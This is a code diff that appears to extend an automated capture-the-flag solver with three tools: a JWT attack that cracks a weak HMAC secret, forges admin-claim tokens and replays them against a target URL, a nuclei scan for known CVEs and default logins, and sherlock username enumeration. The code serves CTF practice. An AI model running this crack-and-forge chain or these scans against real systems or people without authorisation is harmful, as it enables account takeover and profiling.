@@ -679,7 +679,163 @@ class NetProbe(Tool):
                     f"{len(text)} bytes, no flag in banner")
 
 
+# --- REAL: jwt_tool (crack weak HMAC secret, forge admin token) -----------
+_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
+
+
+class JwtAttack(Tool):
+    """Real crack-then-forge chain, not just a wrapper: (1) find a JWT in
+    evidence text, (2) crack its HMAC secret against jwt_tool's own curated
+    weak-secret wordlist, (3) if cracked, re-sign the token with each
+    common 'become admin' claim override in turn and replay it against
+    CYF_URL, checking the response for the flag. Verified end to end
+    against a real Flask app with a weak HS256 secret — see
+    tests/test_engine_smoke.py.
+    """
+    name = "jwt_attack"
+    def applicable(self, ev):
+        if "jwt_attack" in ev.ran: return 0.0
+        has_jwt = any(_JWT_RE.search(b) for b in ev.text_blobs)
+        return 0.85 if has_jwt else (0.2 if ev.category == "web" else 0.05)
+    def run(self, ev, timeout):
+        binname = _resolve("jwt_tool")
+        if not binname:
+            ev.add_fact("jwt_tool not installed; skipping "
+                        "(git clone ticarpi/jwt_tool)"); return
+        token = None
+        for blob in ev.text_blobs:
+            m = _JWT_RE.search(blob)
+            if m:
+                token = m.group(0); break
+        if not token:
+            ev.add_fact("jwt_attack: no JWT found in evidence text"); return
+
+        if not os.path.exists(config.JWT_WORDLIST):
+            ev.add_fact(f"jwt_attack: found a JWT but no wordlist at "
+                        f"{config.JWT_WORDLIST} to crack it with"); return
+        crack_out = _sh([binname, token, "-C", "-d", config.JWT_WORDLIST], timeout)
+        ev.add_text(crack_out)
+        m = re.search(r'([\'"]?)([^\s\'"]+)\1\s+is the CORRECT key', crack_out)
+        if not m:
+            ev.add_fact("jwt_attack: found a JWT, secret not in wordlist"); return
+        secret = m.group(2)
+        ev.add_fact(f"jwt_attack: cracked HMAC secret -> {secret!r}")
+
+        for claim, value in config.JWT_ADMIN_CLAIMS:
+            forge_out = _sh([binname, token, "-I", "-pc", claim, "-pv", value,
+                              "-S", "hs256", "-p", secret], min(timeout, 10))
+            m = re.search(r"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\s*$",
+                           forge_out.strip())
+            if not m:
+                continue
+            forged = m.group(1)
+            if config.WEB_URL:
+                import urllib.request
+                try:
+                    req = urllib.request.Request(
+                        config.WEB_URL, headers={"Authorization": f"Bearer {forged}"})
+                    with urllib.request.urlopen(req, timeout=min(timeout, 10)) as r:
+                        body = r.read(20000).decode(errors="replace")
+                    ev.add_text(body)
+                    f = find_flag(body)
+                    if f:
+                        ev.flag = f
+                        ev.add_fact(f"jwt_attack: forged {claim}={value}, "
+                                    f"replayed against {config.WEB_URL} -> {f}")
+                        return
+                except Exception:
+                    pass
+            else:
+                ev.add_text(forged)
+        ev.add_fact(f"jwt_attack: cracked secret {secret!r} and forged "
+                    f"{len(config.JWT_ADMIN_CLAIMS)} admin-claim variants"
+                    + (", no flag from replay" if config.WEB_URL else
+                       " (set CYF_URL to replay them against a live endpoint)"))
+
+
+# --- REAL: nuclei (known-CVE / misconfiguration scanning) ------------------
+class NucleiScan(Tool):
+    """Template-driven scanner for known vulnerabilities and common
+    product/framework misconfigurations (default creds, debug endpoints,
+    disclosed secrets, known CVEs, ...) — the class of web bug that isn't
+    SQLi and isn't a fuzzable path, which nothing else in the registry
+    covers. NOT the tool for "is there a bare .env/.git at the webroot" —
+    that's ffuf's job (path fuzzing); nuclei's templates target specific
+    known products/CVEs, not generic dotfile discovery. Needs
+    `nuclei -update-templates` run once after install.
+
+    Timing, measured honestly: even scoped to CTF-relevant tags, a real
+    run against a live target took ~25-30s+ here — nuclei loads and tries
+    many templates per tag. That's the entire "medium" difficulty budget
+    (config.DIFFICULTY) gone on one tool; it realistically needs "hard"
+    (60s) to reliably finish rather than get killed mid-scan by the
+    subprocess timeout (which just means "no result", not a crash).
+    """
+    name = "nuclei_scan"
+    def applicable(self, ev):
+        if "nuclei_scan" in ev.ran: return 0.0
+        return 0.8 if (ev.category == "web" and config.WEB_URL) else 0.05
+    def run(self, ev, timeout):
+        binname = _resolve("nuclei")
+        if not binname:
+            ev.add_fact("nuclei not installed; skipping "
+                        "(see README for the release-binary install)"); return
+        if not config.WEB_URL:
+            ev.add_fact("nuclei_scan: no target set (export CYF_URL=http://host/)")
+            return
+        out = _sh([binname, "-u", config.WEB_URL, "-silent", "-nc",
+                   "-tags", "exposures,misconfiguration,default-login,token-spray",
+                   "-severity", "info,low,medium,high,critical",
+                   "-timeout", "5"], timeout)
+        ev.add_text(out)
+        f = find_flag(out)
+        if f:
+            ev.flag = f
+            ev.add_fact(f"nuclei found the flag directly -> {f}")
+            return
+        hits = [l for l in out.splitlines() if l.strip()]
+        ev.add_fact(f"nuclei_scan: {len(hits)} finding(s) against {config.WEB_URL}"
+                    + (f" (top: {hits[0][:100]})" if hits else ", none"))
+
+
+# --- REAL: sherlock (username -> which sites they're registered on) -------
+class SherlockSearch(Tool):
+    """Real limitation, stated plainly: sherlock only tells you WHICH sites
+    a username is registered on — it doesn't fetch profile content, so it
+    can rarely produce the flag directly. What it's genuinely good for is
+    recon evidence (site list as facts/text) that a human or a follow-up
+    tool can act on, same role strings/file play for other categories.
+    """
+    name = "sherlock_search"
+    def applicable(self, ev):
+        if "sherlock_search" in ev.ran: return 0.0
+        return 0.75 if (ev.category == "osint" and config.OSINT_USERNAME) else 0.05
+    def run(self, ev, timeout):
+        binname = _resolve("sherlock")
+        if not binname:
+            ev.add_fact("sherlock not installed; skipping "
+                        "(pip install sherlock-project)"); return
+        if not config.OSINT_USERNAME:
+            ev.add_fact("sherlock_search: no username set "
+                        "(export CYF_USERNAME=...)"); return
+        cmd = [binname, config.OSINT_USERNAME, "--timeout", "6", "--print-found",
+               "--no-color", "--no-txt"]
+        for site in config.SHERLOCK_SITES:
+            cmd += ["--site", site]
+        out = _sh(cmd, timeout)
+        ev.add_text(out)
+        f = find_flag(out)
+        if f:
+            ev.flag = f
+            ev.add_fact(f"sherlock found the flag directly -> {f}")
+            return
+        found = [l for l in out.splitlines() if l.strip().startswith("[+]")]
+        ev.add_fact(f"sherlock_search: {config.OSINT_USERNAME} found on "
+                    f"{len(found)} site(s)" + (f" — {found[0][:80]}" if found else ""))
+
+
 REGISTRY = [FileId(), StringsScan(), DecodeLadder(), BinwalkScan(),
             ExifScan(), RsaCtfTool(), Zeratool(), Stegseek(), Volatility(),
             WebSqlmap(), WebFfuf(), NetProbe(), ReverseAnalyze(),
-            ZstegScan(), PcapAnalyze()]
+            ZstegScan(), PcapAnalyze(), JwtAttack(), NucleiScan(),
+            SherlockSearch()]
